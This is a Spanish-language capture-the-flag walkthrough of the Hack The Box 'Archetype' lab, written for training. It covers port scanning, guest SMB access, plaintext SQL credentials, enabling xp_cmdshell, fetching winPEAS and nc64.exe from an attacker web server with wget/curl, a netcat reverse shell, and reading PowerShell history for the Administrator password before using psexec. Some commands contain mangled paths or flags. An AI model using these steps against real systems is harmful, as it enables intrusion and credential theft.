# Archetype HTB

1. [Enumeración](#enumeración)
```bash
    sudo nmap -sV -n -Pn --disable-arp-ping <IP> -D RND:5

    # Not shown: 995 closed tcp ports (reset)
    # PORT     STATE SERVICE      VERSION
    # 135/tcp  open  msrpc        Microsoft Windows RPC
    # 139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
    # 445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
    # 1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
    # 5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    # Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

``
2. [Explotación](#explotación)
    - Se detecta un servidor SQL Server 2017 (puerto 1433), con autenticación SQL. Se puede usar `mssqlclient` de `impacket` para conectarse al servidor y ejecutar comandos.
    - Se detecta un servidor SMB (puerto 445/139). Se puede usar `smbclient` de `impacket` para interactuar con el servidor SMB, y `psexec` para ejecutar comandos remotos.
    - Se lista los recursos compartidos SMB con `smbclient` y se encuentra un recurso llamado `backup`. Se puede montar este recurso para acceder a los archivos compartidos.

    ```bash
    # Listar recursos compartidos SMB
    smbclient -L //<IP> -U guest

    #Password for [WORKGROUP\guest]:
    #
	#    Sharename       Type      Comment
	#    ---------       ----      -------
	#    ADMIN$          Disk      Remote Admin
	#    backups         Disk      
	#    C$              Disk      Default share
	#    IPC$            IPC       Remote IPC
    ```

    - Se accede al recurso `backups` y se encuentra un archivo llamado `prod.dtsConfig`. Se descarga este archivo para analizarlo localmente.

    ```bash
    # Acceder al recurso compartido
    smbclient \\\\<IP>\\backups -U guest

    #Password for [WORKGROUP\guest]:
    smb: \> ls
    # .                                   D        0  Wed Sep 20 12:00:00 2023
    # ..                                  D        0  Wed Sep 20 12:00:00 2023
    # prod.dtsConfig                      N   1048576  Wed Sep 20 12:00:00 2023

    # Descargar el archivo
    get prod.dtsConfig
    ```

    - Al analizar el archivo `prod.dtsConfig`, se encuentra que contiene credenciales de base de datos en texto plano. Se extraen estas credenciales para usarlas en la conexión al servidor SQL.

    ```xml
    <DTSConfiguration>
        <DTSConfigurationHeading>
            <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
        </DTSConfigurationHeading>
        <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
            <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
        </Configuration>
    </DTSConfiguration>
    ``` 

- Se usa `mssqlclient` para conectarse al servidor SQL con las credenciales obtenidas y se ejecutan comandos para obtener información del sistema y de los usuarios.
- Instalar [`mssqlclient`](https://github.com/SecureAuthCorp/impacket) en un entorno virtual de Python:

```bash
    # Crear entorno virtual e instalar impacket
    python3 -m venv impacket-env
    source impacket-env/bin/activate
    pip install impacket

    cd impacket-env/bin
    # Conectarse al servidor SQL
    python mssqlclient.py ARCHETYPE/sql_svc@<IP> -p 1433 -windows-auth

    # Ejecutar comandos SQL (opcional)
    help
    # Ejecutar consultas SQL para obtener información del sistema y usuarios
    SELECT is_srvrolemember(‘sysadmin’);
    # Habilitar xp_cmdshell para ejecutar comandos del sistema operativo
    EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
    # Ejecutar comandos del sistema operativo
    EXEC xp_cmdshell 'whoami';
    EXEC xp_cmdshell 'net user';
```

> Nota: Sitio de referencia para inyección de comandos SQL: https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

- Una vez obtenida una shell en el sistema, se pueden transferir archivos hacia el servidor para escalar privilegios o crear una shell inversa.
- En la PC atacante se crea un pequeño servidor web para alojar el programa (shell reversa o escalador de privilegios) que se descargará y ejecutará en el servidor objetivo.


* Escalador de privilegios con [`winPEAS.exe`](https://github.com/carlospolop/PEASS-ng/releases)

```bash
    # En otra instancia de terminal, crear un servidor web en la PC atacante para alojar nc64.exe
    # Descargar nc64.exe para la carpeta Descargas de la PC atacante
    cd ~/Downloads
    # Crear servidor web en la PC atacante
    python3 -m http.server 8000
```

- En la shell obtenida en el servidor objetivo, se descarga `winPEAS.exe` desde la PC atacante y se ejecuta

```bash
    # En la shell del servidor objetivo:
    # Descargar winPEAS.exe desde la PC atacante
    xp_cmdshell 'powershell -c cd C:.\Users\sql_svc\Downloads; wget http://<IP>:8000/winPEAS.exe -outfile winPEAS.exe'
    # o con curl:
    xp_cmdshell 'powershell -c cd C:.\Users\sql_svc\Downloads; curl -o winPEAS.exe http://<IP>:8000/winPEAS.exe'
    # Ejecutar winPEAS.exe para buscar posibles vectores de escalada de privilegios
    xp_cmdshell 'C:.\Users\sql_svc\Downloads\winPEAS.exe'
```


* Shell reversa con [`nc64.exe`](https://github.com/int0x33/nc.exe/blob/master/nc64.exe)

```bash
    # En otra instancia de terminal, crear un servidor web en la PC atacante para alojar nc64.exe
    # Descargar nc64.exe para la carpeta Descargas de la PC atacante
    cd ~/Downloads
    # Crear servidor web en la PC atacante
    python3 -m http.server 8000
    # En otra instancia de terminal, escuchar conexiones entrantes para la shell reversa
    nc -lvnp 443
```

- En la shell obtenida en el servidor objetivo, se descarga `nc64.exe` desde la PC atacante y se ejecuta para establecer la conexión reversa.

```bash
    # En la shell del servidor objetivo:
    # Descargar nc64.exe desde la PC atacante
    xp_cmdshell 'powershell -c cd C:.\Users\sql_svc\Downloads; wget http://<IP>:8000/nc64.exe -outfile nc64.exe'
    # o con curl:
    xp_cmdshell 'powershell -c cd C:.\Users\sql_svc\Downloads; curl -o nc64.exe http://<IP>:8000/nc64.exe'
    # Ejecutar nc64.exe para establecer la conexión reversa
    xp_cmdshell 'C:.\Users\sql_svc\Downloads\nc64.exe -e cmd.exe <IP> 443'
```

3. [Post-explotación](#post-explotación)

- Analizando los resultados de `winPEAS.exe`, se identifican posibles vectores de escalada de privilegios, en este caso se encentra el fichero ` C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` con la información de comandos ejecutados. En el archivo se encuentra la contraseña del Administrador local (`Administrator`) en texto plano, lo que permite escalar privilegios a este usuario.

```bash
    # Analizar el archivo ConsoleHost_history.txt para encontrar la contraseña del Administrador local
    xp_cmdshell 'type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
```

- Se pueden usar herramientas como `psexec` de `impacket` para ejecutar comandos

```bash
    source impacket-env/bin/activate
    cd impacket-env/bin
    # Ejecutar comandos como Administrador local usando psexec
    python psexec.py ARCHETYPE/Administrator@<IP> -p 1433 -windows-auth
    # o
    python psexec.py administrador:'<PASSWORD>'@<IP> 
```

- Con la cuenta de Administrador local, se pueden acceder a todos los archivos del sistema y realizar cualquier acción, incluyendo la extracción de la flag de usuario y la flag de root, las cuales se encuentran en las carpetas de Escritorio correspondientes.